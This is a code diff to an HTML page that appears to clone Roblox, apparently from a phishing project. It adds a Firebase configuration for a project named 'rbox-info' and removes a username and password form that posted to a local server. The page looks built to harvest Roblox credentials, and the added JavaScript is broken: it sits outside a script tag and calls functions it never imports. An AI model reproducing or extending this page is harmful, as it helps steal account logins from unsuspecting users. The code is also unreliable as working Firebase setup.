@@ -19,7 +19,21 @@
 
     <link rel="apple-touch-icon" href="https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png" />
 
+<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore.js"></script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDhIo2icBXVADCEgDB6c_ISag8M92fYVMU",
+  authDomain: "rbox-info.firebaseapp.com",
+  projectId: "rbox-info",
+  storageBucket: "rbox-info.firebasestorage.app",
+  messagingSenderId: "750702510",
+  appId: "1:750702510:web:2469f35269bfa64d45c23f",
+  measurementId: "G-QN4J8XYN6Z"
+};
 
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const analytics = getAnalytics(app);
 
 <script type="application/ld+json">
     {
@@ -983,16 +997,6 @@ function checkRobloxInstall() {
 
    
 
-    <form action="http://localhost:3000/submit" method="POST">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required>
-        <br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required>
-        <br>
-        <button type="submit">Submit</button>
-    </form>
-</body>
-</html>
+
 </body>
 </html>
